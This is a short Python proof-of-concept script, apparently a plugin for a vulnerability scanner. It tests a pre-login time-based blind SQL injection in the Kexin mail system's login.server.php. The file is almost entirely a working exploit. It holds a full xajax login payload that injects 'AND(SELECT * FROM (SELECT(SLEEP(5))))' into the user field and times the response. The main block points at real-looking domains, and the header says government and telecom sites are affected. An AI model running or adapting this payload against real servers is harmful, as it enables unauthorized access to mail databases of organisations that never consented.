#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 科信邮件系统漏洞另一处SQL盲注(无需登录23案例涉及政府部门运营商) 
Author    :  a
mail      :  a@lcx.cc
 
refer     :  wooyun-2010-0122071
 
"""
import time
def assign(service, arg):
     if service == "kxmail":
        return True, arg


def audit(arg):
    path='prog/login.server.php'
    payload="xjxfun=Function_PostLogin&xjxr=1434907361662&xjxargs[]=<xjxobj><e><k>lo_os</k><v>SWindows_NT</v></e><e><k>lo_processor</k><v>S<![CDATA[EM64T Family 15 Model 6 Stepping 8, GenuineIntel]]></v></e><e><k>lo_computername</k><v>SRD-HL-EMAIL</v></e><e><k>lo_user_agent</k><v>S<![CDATA[Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14]]></v></e><e><k>lo_ip</k><v>S...</v></e><e><k>lo_language</k><v>S<![CDATA[zh-CN,zh;q=0.8]]></v></e><e><k>user</k><v>Sadmin139</v></e><e><k>domain</k><v>S...</v></e><e><k>passwd</k><v>Sadmin</v></e><e><k>co_language_select</k><v>S<![CDATA[../language/chinese_gb.php]]></v></e><e><k>co_sy_id</k><v>S10</v></e><e><k>random_pic</k><v>S5139</v></e><e><k>random_num</k><v>S240955</v></e></xjxobj>"
    target=arg+path
    fst_s=time.time()
    code1, head, res, errcode, _ = curl.curl2(target,payload)
    fst_e=time.time()

    
    payload="xjxfun=Function_PostLogin&xjxr=1434907361662&xjxargs[]=<xjxobj><e><k>lo_os</k><v>SWindows_NT</v></e><e><k>lo_processor</k><v>S<![CDATA[EM64T Family 15 Model 6 Stepping 8, GenuineIntel]]></v></e><e><k>lo_computername</k><v>SRD-HL-EMAIL</v></e><e><k>lo_user_agent</k><v>S<![CDATA[Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14]]></v></e><e><k>lo_ip</k><v>S...</v></e><e><k>lo_language</k><v>S<![CDATA[zh-CN,zh;q=0.8]]></v></e><e><k>user</k><v>Sadmin139' AND(SELECT * FROM (SELECT(SLEEP(5)))taSu) AND 'dwkL'='dwkL</v></e><e><k>domain</k><v>S...</v></e><e><k>passwd</k><v>Sadmin</v></e><e><k>co_language_select</k><v>S<![CDATA[../language/chinese_gb.php]]></v></e><e><k>co_sy_id</k><v>S10</v></e><e><k>random_pic</k><v>S5139</v></e><e><k>random_num</k><v>S240955</v></e></xjxobj>"
    sec_s=time.time()
    code2, head, res, errcode, _ = curl.curl2(target,payload)
    sec_e=time.time()

    fst=fst_e-fst_s
    sec=sec_e-sec_s
    
    if code1==code2!=0 and fst<2 and sec>5:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('kxmail','http://mail.gdca.com.cn/')[1])
    #audit(assign('kxmail','http://www.kaiyuanzhongxue.com/')[1])